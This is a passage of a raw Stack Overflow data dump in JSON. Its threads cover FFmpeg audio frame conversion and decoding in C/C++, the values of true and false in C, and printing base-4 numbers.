buffer:</p>\n\n<pre><code>void AudioManager::add_av_frame(AVFrame *frame) {\n    int     nsamples    = frame-&gt;nb_samples;\n    int     sample_rate = frame-&gt;sample_rate;\n    int     channels    = frame-&gt;channels;\n    AVSampleFormat format = (AVSampleFormat) frame-&gt;format;\n    bool    planar      = av_sample_fmt_is_planar(format) == 1;\n\n    int64_t pts         = av_frame_get_best_effort_timestamp(frame);\n    //double ftime;\n\n    /*if (ffmpeg.vid_stream.stream_id != -1)\n        ftime = av_q2d(ffmpeg.aud_stream.context-&gt;time_base) * pts;\n    else\n        ftime = av_q2d(ffmpeg.vid_stream.context-&gt;time_base) * pts;*/\n\n    AudioBuffer *buffer = NULL;\n\n    if (planar) {   // handle planar audio frames\n        /*\n         * PLANAR frames conversion\n         * ------------------------\n         */\n        if (channels == 1) {      // MONO\n\n            //LOGD(\"Processing PLANAR MONO\");\n            /*\n             * MONO\n             */\n\n            if (format == AV_SAMPLE_FMT_S16P) {     // 16 bit signed\n                if ((buffer = alloc_buffer(frame))) {   // allocated okay?\n                    short *channel = (short*)frame-&gt;data[0];\n                    short *buff = buffer-&gt;data;\n                    for (int c = 0; c &lt; nsamples; c++) {\n                        *buff++ = *channel;\n                        *buff++ = *channel++;\n                    }\n                    queue_new_buffer(buffer);\n                }\n                return;\n            }\n            if (format == AV_SAMPLE_FMT_S32P) {     // 32 bit signed\n                if ((buffer = alloc_buffer(frame))) {    // allocated okay?\n                    int32_t *channel = (int32_t*)frame-&gt;data[0];\n                    short *buff = buffer-&gt;data;\n                    for (int c = 0; c &lt; nsamples; c++) {\n                        int16_t s = (int16_t) (*channel++ &gt;&gt; 16);\n                        *buff++ = s;\n                        *buff++ = s;\n                    }\n                    queue_new_buffer(buffer);\n                }\n                return;\n            }\n            if (format == AV_SAMPLE_FMT_U8P) {      // 8 bit unsigned\n                if ((buffer = alloc_buffer(frame))) {    // allocated okay?\n                    uint8_t *channel = (uint8_t*)frame-&gt;data[0];\n                    short *buff = buffer-&gt;data;\n                    for (int c = 0; c &lt; nsamples; c++) {\n                        int16_t s = ((int16_t)(*channel++ - 128) &lt;&lt; 8);\n                        *buff++ = s;\n                        *buff++ = s;\n                    }\n                    queue_new_buffer(buffer);\n                }\n            }\n            return; // scrap if no audio buffer (highly unlikely)\n\n        } else if (channels == 2) {                         // STEREO\n\n            //LOGD(\"Processing PLANAR STEREO\");\n            /*\n             * STEREO\n             */\n\n            if (format == AV_SAMPLE_FMT_S16P) {     // 16 bit signed\n                if ((buffer = alloc_buffer(frame))) {    // allocated okay\n                    short *channel1 = (short*)frame-&gt;data[0];\n                    short *channel2 = (short*)frame-&gt;data[1];\n                    short *buff = buffer-&gt;data;\n                    for (int c = 0; c &lt; nsamples; c++) {\n                        *buff++ = *channel1++;\n                        *buff++ = *channel2++;\n                    }\n                    queue_new_buffer(buffer);\n                }\n                return;\n            }\n            if (format == AV_SAMPLE_FMT_S32P) {     // 32 bit signed\n                if ((buffer = alloc_buffer(frame))) {    // allocated okay?\n                    int32_t *channel1 = (int32_t*)frame-&gt;data[0];\n                    int32_t *channel2 = (int32_t*)frame-&gt;data[1];\n                    short *buff = buffer-&gt;data;\n                    for (int c = 0; c &lt; nsamples; c++) {\n                        int16_t s1 = (int16_t) (*channel1++ &gt;&gt; 16);\n                        int16_t s2 = (int16_t) (*channel2++ &gt;&gt; 16);\n                        *buff++ = s1;\n                        *buff++ = s2;\n                    }\n                    queue_new_buffer(buffer);\n                }\n                return;\n            }\n            if (format == AV_SAMPLE_FMT_U8P) {      // 8 bit unsigned\n                if ((buffer = alloc_buffer(frame))) {    // allocated okay?\n                    uint8_t *channel1 = (uint8_t*)frame-&gt;data[0];\n                    uint8_t *channel2 = (uint8_t*)frame-&gt;data[1];\n                    short *buff = buffer-&gt;data;\n                    for (int c = 0; c &lt; nsamples; c++) {\n                        int16_t s1 = ((int16_t)(*channel1++ - 128) &lt;&lt; 8);\n                        int16_t s2 = ((int16_t)(*channel2++ - 128) &lt;&lt; 8);\n                        *buff++ = s1;\n                        *buff++ = s2;\n                    }\n                    queue_new_buffer(buffer);\n                }\n            }\n            return;\n\n        }   // TODO: Handle more channels at a later date\n\n    } else {        // handle non-planar audio frames\n        /*\n         * INTERLEAVED conversion\n         * ----------------------\n         */\n    }\n}\n</code></pre>\n\n<p>Process the audio buffer:</p>\n\n<pre><code>void AudioManager::queue_new_buffer(AudioBuffer *buffer) {\n    if (buffer) {   // valid buffer\n\n        // apply volume gain (only working with stereo)\n\n        if (volume != 100) {\n            short *data = buffer-&gt;data;\n            int num_samples = buffer-&gt;nsamples &lt;&lt; 1;\n            while (num_samples--) {\n                long sample = ((long)*data * volume) / 100;\n                if (sample &lt; -32768) sample = -32768;\n                if (sample &gt;  32767) sample =  32767;\n                *data++ = (short)sample;\n            }\n        }\n\n        // add buffer to queue\n\n        buffer-&gt;used = true;\n\n        double pts_start = get_pts_start_time();\n\n        decode_pos = (++decode_pos) % MAX_AUD_BUFFERS;\n        if (decode_pos == playback_pos)\n            playback_pos = (++playback_pos) % MAX_AUD_BUFFERS;\n\n        if (ffmpeg.vid_stream.stream_id == -1 &amp;&amp; pts_start &lt; 0.0) {\n            set_pts_start_time(buffer-&gt;frame_time);\n            set_sys_start_time(Display.get_current_render_time());\n            LOGD(\"START TIME FROM AUDIO STREAM...\");\n        }\n\n        //LOGI(\"Audio buffer queued %d (%d)\", decode_pos, playback_pos);\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 6038550, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99bf40badc974553c6d398d81a561c6e?s=128&d=identicon&r=PG&f=1", "display_name": "USER 556", "link": "https://stackoverflow.com/users/6038550/user-556"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 332, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1476367323, "creation_date": 1476310599, "last_edit_date": 1476358704, "question_id": 40009271, "link": "https://stackoverflow.com/questions/40009271/how-to-get-rid-of-unresolved-external-errors-while-trying-to-decode-audio-using", "title": "How to get rid of unresolved external errors while trying to decode audio using ffmpeg", "body": "<p>I am trying to decode a audio file using ffmpeg, while I am doing this I am getting many unresolved external errors. I am new to ffmpeg libraries, any suggestion for the problem would be a great help.</p>\n\n<p>Thank you.</p>\n\n<pre><code>        void audioDecode(char* filename)\n{\n    FILE *file;\n    AVFormatContext *audioInputFormatContext;\n    AVInputFormat *audioInputFormat = NULL;\n    AVCodec *audioCodec;\n    AVCodecContext *audioCodecContext;\n\n    av_register_all();\n\n    char *audioInputDeviceName = filename;\n    int ret;\n    int audioIndex = 0;\n    AVPacket pkt;\n    av_init_packet(&amp;pkt);\n\n    avformat_network_init();\n\n    audioInputFormatContext = avformat_alloc_context();\n    ret = avformat_open_input(&amp;audioInputFormatContext, audioInputDeviceName, audioInputFormat, NULL);\n\n    if (ret == 0)\n    {\n        ret = avformat_find_stream_info(audioInputFormatContext, 0);\n        if (ret &gt;= 0)\n        {\n            for (int i = 0; i &lt; audioInputFormatContext-&gt;nb_streams; i++) {\n                if (audioInputFormatContext-&gt;streams[i]-&gt;codecpar-&gt;codec_type == AVMEDIA_TYPE_AUDIO) {\n                    audioIndex = i;\n                    break;\n                }\n            }\n            audioCodec = avcodec_find_decoder(audioInputFormatContext-&gt;streams[audioIndex]-&gt;codecpar-&gt;codec_id);\n            audioCodecContext = avcodec_alloc_context3(audioCodec);\n            avcodec_parameters_to_context(audioCodecContext, audioInputFormatContext-&gt;streams[audioIndex]-&gt;codecpar);\n\n            if (avcodec_open2(audioCodecContext, audioCodec, NULL) &gt;= 0)\n            {\n                ret = av_read_frame(audioInputFormatContext, &amp;pkt);\n                AVPacket encodePacket;\n                AVFrame* decodeFrame = av_frame_alloc();\n                int dec_got_frame = 0;\n                if (ret == 0)\n                {\n                    ret = avcodec_send_packet(audioCodecContext, &amp;pkt);\n                    if (ret &lt; 0)\n                        printf(\"Error\");\n                }\n                ret = avcodec_receive_frame(audioCodecContext, decodeFrame);\n\n                if (ret &gt;= 0)\n                    dec_got_frame = 1;\n                if (dec_got_frame)\n                {\n\n                    fopen_s(&amp;file, filename, \"wb\");\n                    fwrite(pkt.data, 1, pkt.size, file);\n                    fclose(file);\n\n                }\n\n                av_frame_free(&amp;decodeFrame);\n\n            }\n        }\n    }\n\n    avformat_close_input(&amp;audioInputFormatContext);\n    avcodec_free_context(&amp;audioCodecContext);\n\n    av_packet_unref(&amp;pkt);\n}\n</code></pre>\n"}, {"tags": ["c", "boolean"], "comments": [{"owner": {"reputation": 70686, "user_id": 11683, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/d4d284c3c214d52f004df795aee394e3?s=128&d=identicon&r=PG", "display_name": "GSerg", "link": "https://stackoverflow.com/users/11683/gserg"}, "edited": false, "score": 0, "creation_date": 1476309556, "post_id": 40009029, "comment_id": 67296258, "body": "Arguably a duplicate of <a href=\"http://stackoverflow.com/q/1921539/11683\">Using boolean values in C</a>"}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 1, "creation_date": 1476309790, "post_id": 40009029, "comment_id": 67296347, "body": "The expressions <code>true == 1</code> and <code>false == 0</code> are both true. (And <code>true == 2</code> is not true). If that&#39;s not what you meant, could you clarify the question?"}, {"owner": {"reputation": 173, "user_id": 7010461, "user_type": "registered", "profile_image": "https://graph.facebook.com/1118050918232565/picture?type=large", "display_name": "Piotrek Karpowicz", "link": "https://stackoverflow.com/users/7010461/piotrek-karpowicz"}, "reply_to_user": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1476310060, "post_id": 40009029, "comment_id": 67296454, "body": "@M.M Oh yes, Im sorry now I see what I just wrote.  I mean when you want to use something in while or if , do you use (lets say)   while(blabla == 0) , or something else."}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 1, "creation_date": 1476310659, "post_id": 40009029, "comment_id": 67296662, "body": "<code>while(X)</code> is equivalent to <code>while( (X) != 0 )</code>"}, {"owner": {"reputation": 26723, "user_id": 995714, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/w1393.jpg?s=128&g=1", "display_name": "phuclv", "link": "https://stackoverflow.com/users/995714/phuclv"}, "edited": false, "score": 0, "creation_date": 1495551629, "post_id": 40009029, "comment_id": 75295265, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/2254075/using-true-and-false-in-c\">Using true and false in C</a>"}], "answers": [{"comments": [{"owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "edited": false, "score": 4, "creation_date": 1476309693, "post_id": 40009047, "comment_id": 67296317, "body": "The question seems to refer to specific entities: <code>bool</code> <code>true</code> and <code>false</code>, not to general set of values that &quot;makes <code>if</code> take the true branch&quot;."}, {"owner": {"reputation": 3706, "user_id": 2018455, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/e75a41fc224930ef1fa9ddcc9c714174?s=128&d=identicon&r=PG", "display_name": "Neil Locketz", "link": "https://stackoverflow.com/users/2018455/neil-locketz"}, "reply_to_user": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "edited": false, "score": 2, "creation_date": 1476309824, "post_id": 40009047, "comment_id": 67296363, "body": "@AnT if he didn&#39;t say he was new to programming I would have gone into that. But it is easy to tell that this is what he meant."}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 4, "creation_date": 1476310343, "post_id": 40009047, "comment_id": 67296561, "body": "Depends on what you mean by &quot;is true&quot;. The identifier <code>true</code> is a macro defined in <code>&lt;stdbool.h&gt;</code>, and its value is specifically <code>1</code> (and its type is <code>int</code>). On the other hand, any non-zero value is treated as true when used as a condition. That&#39;s why something like <code>if (b == true)</code> is dangerous; just write <code>if (b)</code> instead."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1476310671, "post_id": 40009047, "comment_id": 67296666, "body": "And that is why IMO the <code>bool</code> is of use only for setting a value, not testing. For testing, it&#39;s inherent in the C langauge without any formal definition. I&#39;ll go further: the <code>bool</code> type is completely useless except possibly to distiguish from those languages where <code>true</code> is <code>-1</code>, but the same applies: <code>0</code> is false, anything else is true."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1476314172, "post_id": 40009047, "comment_id": 67297721, "body": "More accurately anything that <i>compares equal to 0</i> is false.  A null pointer may not be 0, yet compares equally to 0 and so is false as in <code>if(null_pointer)</code>"}], "tags": [], "owner": {"reputation": 3706, "user_id": 2018455, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/e75a41fc224930ef1fa9ddcc9c714174?s=128&d=identicon&r=PG", "display_name": "Neil Locketz", "link": "https://stackoverflow.com/users/2018455/neil-locketz"}, "is_accepted": false, "score": 36, "last_activity_date": 1476309427, "creation_date": 1476309427, "answer_id": 40009047, "question_id": 40009029, "link": "https://stackoverflow.com/questions/40009029/in-c-in-bool-true-1-and-false-0/40009047#40009047", "title": "In c, in bool, true == 1 and false == 0?", "body": "<p>More accurately anything that is not <code>0</code> is true.</p>\n\n<p>So <code>1</code> is true, but so is <code>2</code>, <code>3</code> ... etc.</p>\n"}, {"comments": [{"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 2, "creation_date": 1476309954, "post_id": 40009143, "comment_id": 67296415, "body": "Yet another weird quirk of C... <code>true</code> is an int, not a bool"}, {"owner": {"reputation": 173, "user_id": 7010461, "user_type": "registered", "profile_image": "https://graph.facebook.com/1118050918232565/picture?type=large", "display_name": "Piotrek Karpowicz", "link": "https://stackoverflow.com/users/7010461/piotrek-karpowicz"}, "edited": false, "score": 0, "creation_date": 1476310213, "post_id": 40009143, "comment_id": 67296508, "body": "Thanks, that did help, as someone pointed out I didnt specify the question very well, but you managed to answer it anyway, thanks again!  , and Im sorry, I really dont know where to even check which version :/ Im really green at this point :/"}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 2, "creation_date": 1476310241, "post_id": 40009143, "comment_id": 67296520, "body": "<a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1256.pdf\" rel=\"nofollow noreferrer\">N1256</a> is a draft of the 1999 ISO C standard.  The latest standard is C11; the latest draft is <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf\" rel=\"nofollow noreferrer\">N1570</a>. <code>_Bool</code> and <code>&lt;stdbool.h&gt;</code> were added to the language by C99 (and of course retained in C11)."}, {"owner": {"reputation": 610493, "user_id": 88656, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6fbdff3ffb6f111d172759b4f05bea0e?s=128&d=identicon&r=PG", "display_name": "Eric Lippert", "link": "https://stackoverflow.com/users/88656/eric-lippert"}, "reply_to_user": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 0, "creation_date": 1476310366, "post_id": 40009143, "comment_id": 67296566, "body": "@KeithThompson: Indeed. Absent any guidance from the original poster I simply picked the first standard that a search turned up. Thanks for the link."}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 1, "creation_date": 1476310848, "post_id": 40009143, "comment_id": 67296742, "body": "@EricLippert <code>bool</code> is a typedef for a type <code>_Bool</code> which is an integer type distinct from any other integer type.  <code>true</code> is a macro that expands to the <code>int</code> <code>1</code>.  I can give chapter and verse for each of those if you are unable to find it."}, {"owner": {"reputation": 610493, "user_id": 88656, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6fbdff3ffb6f111d172759b4f05bea0e?s=128&d=identicon&r=PG", "display_name": "Eric Lippert", "link": "https://stackoverflow.com/users/88656/eric-lippert"}, "reply_to_user": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1476311102, "post_id": 40009143, "comment_id": 67296840, "body": "@M.M: Ah, I see the distinction you are making now; it is the distinction between the <i>canonical type of an expression</i>, and <i>the set of values which are compatible with a type</i>. I withdraw my objection. Incidentally, C# makes a similar distinction; the literal <code>0</code> is assignable to any variable of any enum type, despite having type <code>int</code>, which is itself not implicitly convertible to any enum type."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1476312680, "post_id": 40009143, "comment_id": 67297340, "body": "@M.M Does &quot;<code>true</code> which expands to the integer constant 1,&quot; (C11 7.18) or something else require <code>true</code> to be type <code>int</code> or could it be type <code>unsigned</code> or even some other integer type?"}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1476312946, "post_id": 40009143, "comment_id": 67297401, "body": "@chux see N1570 6.4.4.1 for the definition of &quot;integer constant&quot; plus a table for determining the type . In C &quot;integer constant&quot; is what C++ calls &quot;integer literal&quot; (I think the latter is a more intuitive terminology).  I think it&#39;s clear that &quot;integer constant 1&quot; means <code>1</code>  although I see where you are looking for a wiggle room."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1476313522, "post_id": 40009143, "comment_id": 67297564, "body": "@M.M I just never considered the type of <code>true</code>.  Spec uses &quot;integer constant 1&quot; (unformatted 1) and &quot;integer constant <code>1</code>&quot;  (formatted 1) in various places.  With <code>true</code>, it is the unformatted 1.  OTOH, I think somewhere in the spec, formatting is informative and not normative, so that means little."}], "tags": [], "owner": {"reputation": 610493, "user_id": 88656, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6fbdff3ffb6f111d172759b4f05bea0e?s=128&d=identicon&r=PG", "display_name": "Eric Lippert", "link": "https://stackoverflow.com/users/88656/eric-lippert"}, "is_accepted": false, "score": 4, "last_activity_date": 1476310396, "last_edit_date": 1476310396, "creation_date": 1476309889, "answer_id": 40009143, "question_id": 40009029, "link": "https://stackoverflow.com/questions/40009029/in-c-in-bool-true-1-and-false-0/40009143#40009143", "title": "In c, in bool, true == 1 and false == 0?", "body": "<p>You neglected to say which version of C you are concerned about. Let's assume it's this one:</p>\n\n<p><a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf\" rel=\"nofollow\">http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf</a></p>\n\n<p>As you can see by reading the specification, the standard definitions of <code>true</code> and <code>false</code> are 1 and 0, yes. </p>\n\n<p>If your question is about a different version of C, or about <em>non-standard</em> definitions for <code>true</code> and <code>false</code>, then ask a more specific question.</p>\n"}], "owner": {"reputation": 173, "user_id": 7010461, "user_type": "registered", "profile_image": "https://graph.facebook.com/1118050918232565/picture?type=large", "display_name": "Piotrek Karpowicz", "link": "https://stackoverflow.com/users/7010461/piotrek-karpowicz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 125984, "favorite_count": 4, "answer_count": 2, "score": 14, "last_activity_date": 1538722691, "creation_date": 1476309348, "last_edit_date": 1538722691, "question_id": 40009029, "link": "https://stackoverflow.com/questions/40009029/in-c-in-bool-true-1-and-false-0", "title": "In c, in bool, true == 1 and false == 0?", "body": "<p>Just to clarify I found similar answer but for C++, I'm kinda new to coding so I'm not sure whether it applies to C as well.</p>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1476309295, "post_id": 40008966, "comment_id": 67296142, "body": "Your code wouldn&#39;t print any <code>4</code> &#39;s ... are you sure that is your real output?"}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 1, "creation_date": 1476309334, "post_id": 40008966, "comment_id": 67296165, "body": "If you want to print every 4 digit number, you&#39;re going to need to include some more logic. Currently you cycle the first digit then the second etc., this won&#39;t get numbers where the first digit is lower than the second digit for example."}, {"owner": {"reputation": 7022, "user_id": 7659995, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/iZH7M.png?s=128&g=1", "display_name": "MD XF", "link": "https://stackoverflow.com/users/7659995/md-xf"}, "reply_to_user": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1476309382, "post_id": 40008966, "comment_id": 67296188, "body": "@M.M sorry about the <code>4</code>s, it was from a  previous version..."}], "answers": [{"comments": [{"owner": {"reputation": 7022, "user_id": 7659995, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/iZH7M.png?s=128&g=1", "display_name": "MD XF", "link": "https://stackoverflow.com/users/7659995/md-xf"}, "edited": false, "score": 0, "creation_date": 1476309946, "post_id": 40009142, "comment_id": 67296410, "body": "How do I implement this?"}], "tags": [], "owner": {"reputation": 124806, "user_id": 121747, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/9fcebb68b105446c0d9eebbce1146044?s=128&d=identicon&r=PG&f=1", "display_name": "Jack", "link": "https://stackoverflow.com/users/121747/jack"}, "is_accepted": false, "score": -1, "last_activity_date": 1476309888, "creation_date": 1476309888, "answer_id": 40009142, "question_id": 40008966, "link": "https://stackoverflow.com/questions/40008966/increment-array-to-a-certain-number/40009142#40009142", "title": "Increment array to a certain number", "body": "<p>You don't need to use an array at all for this purpose. How you choose to represent a value and the value itself are two different things.</p>\n\n<p>The same value, for example 10, can be represented in any different base you wish, it's <code>10</code> in base 10, <code>0xA</code> in base 16, <code>12</code> in base <code>8</code> and so on.</p>\n\n<p>At the same time incrementing a value by 1 works under every base. Assuming this you can easily just format an <code>unsigned integer</code> to print it as a base4 number.</p>\n\n<p>Mind that with <code>(value &gt;&gt; (i*2)) &amp; 0x3</code> you extract the i-th digit, then everything becomes trivial.</p>\n"}, {"tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": false, "score": 2, "last_activity_date": 1497093819, "last_edit_date": 1497093819, "creation_date": 1476310886, "answer_id": 40009335, "question_id": 40008966, "link": "https://stackoverflow.com/questions/40008966/increment-array-to-a-certain-number/40009335#40009335", "title": "Increment array to a certain number", "body": "<p>You can use a function to convert a number into its representation in base 4 (ie: using only digits 0, 1, 2 and 3):</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nchar *itoa4(unsigned value, char *dest, int digits) {\n    dest[digits] = '\\0';\n    while (digits-- &gt; 0) {\n        dest[digits] = '0' + value % 4;\n        value /= 4;\n    }\n    return dest;\n}\n\nint main(void) {\n    char buf[5];\n    for (int i = 0; i &lt; 256; i++) {\n        printf(\"%s\\n\", itoa4(i, buf, 4));\n    }\n    return 0;\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1476407812, "post_id": 40029446, "comment_id": 67343940, "body": "Do you mind accepting my answer since you copied it?"}, {"owner": {"reputation": 7022, "user_id": 7659995, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/iZH7M.png?s=128&g=1", "display_name": "MD XF", "link": "https://stackoverflow.com/users/7659995/md-xf"}, "reply_to_user": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1476461549, "post_id": 40029446, "comment_id": 67371357, "body": "@chqrlie I did not copy your answer. Your answer reminded me of something I saw in a C Programming book. I found it in there and modified it to fix my problem"}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 2, "creation_date": 1476472908, "post_id": 40029446, "comment_id": 67377272, "body": "my bad, the function name and layout looked strikingly similar to my code, but indeed they are different."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1497047235, "post_id": 40029446, "comment_id": 75931644, "body": "@chqrlie can the OP really accept own answer to own question?"}, {"owner": {"reputation": 7022, "user_id": 